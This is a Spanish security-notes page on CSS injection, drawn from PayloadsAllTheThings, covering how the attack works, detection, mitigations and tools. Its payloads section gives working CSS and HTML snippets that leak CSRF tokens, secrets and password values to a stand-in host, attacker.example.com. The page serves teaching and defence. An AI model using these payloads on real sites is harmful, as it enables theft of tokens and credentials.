---
tags:
  - seguridad-web
  - owasp
  - css-injection
aliases:
  - CSS Injection
  - CSS Exfiltration
---

# Inyección CSS

**Ocurre cuando la aplicación permite inyectar CSS no confiable en la página.** Aunque CSS no ejecuta JavaScript, sirve para exfiltrar datos sensibles (tokens CSRF, secretos) provocando peticiones de red según los atributos de los elementos. Es especialmente útil cuando la CSP bloquea JS pero permite estilos.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Los selectores de atributos de CSS pueden coincidir con valores concretos. Al asociar una `background-image: url(...)` a una coincidencia, el navegador hace una petición al servidor del atacante, filtrando el carácter detectado. Repitiendo el proceso carácter a carácter (a menudo recargando un iframe) se reconstruye el valor completo.

## Detección y pruebas
- Buscar puntos donde el usuario controle estilos, atributos `style` o un `<style>` reflejado.
- Probar selectores de prefijo `^=`, sufijo `$=` y subcadena `*=`.
- Verificar si `@import` externo se carga (exfiltración ciega).

## Explotación / payloads
Exfiltración por selector + `background-image` (fuerza bruta de prefijo):
```css
input[name="csrf-token"][value^="a"] {
  background-image: url(http://attacker.example.com/?prefix=a);
}
```

Inputs ocultos: usar selector hermano para estilar un elemento visible:
```css
input[name="csrf-token"][value^="a"] + input { background: url(https://attacker.example.com/?q=a); }
```

`:has()` para estilar el padre según el hijo:
```css
div:has(input[value="1337"]) { background: url(https://attacker.example.com/?v=1337); }
```

Exfiltración ciega con `@import` (Sequential Import Chaining encadena pasos sin recargar):
```html
<style>@import url(http://attacker.example.com/staging?len=32);</style>
```

Oráculo de existencia de carácter con `@font-face` + `unicode-range` (carga el font solo si el carácter está presente):
```html
<style>
@font-face{ font-family:poc; src:url(http://attacker.example.com/?A); unicode-range:U+0041; }
#secret{ font-family:poc; }
</style>
```

Extracción de atributo con `attr()` + `image-set()` (hoja de estilos cross-domain):
```css
input[name="password"] { background: image-set(attr(value)); }
```

## Mitigación
- Sanitizar y no permitir CSS arbitrario provisto por el usuario; usar una whitelist de propiedades seguras.
- CSP restrictiva: limitar `style-src`, `font-src` e `img-src` a orígenes de confianza (evita `url()` externas).
- No alojar tokens/secretos en atributos de elementos accesibles desde CSS.
- Aislar contenido de usuario en sandboxes/iframes sin acceso a la página principal.

## Herramientas
- blind-css-exfiltration, PortSwigger/css-exfiltration, sic (Sequential Import Chaining), fontleak (ligaduras), css-scrollbar-attack.

---
🔗 Relacionado: [[XSS (Cross-Site Scripting)]] · [[XS-Leaks]] · [[DOM Clobbering]]
📚 Fuente: [PayloadsAllTheThings — CSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection) (MIT, © Swissky)
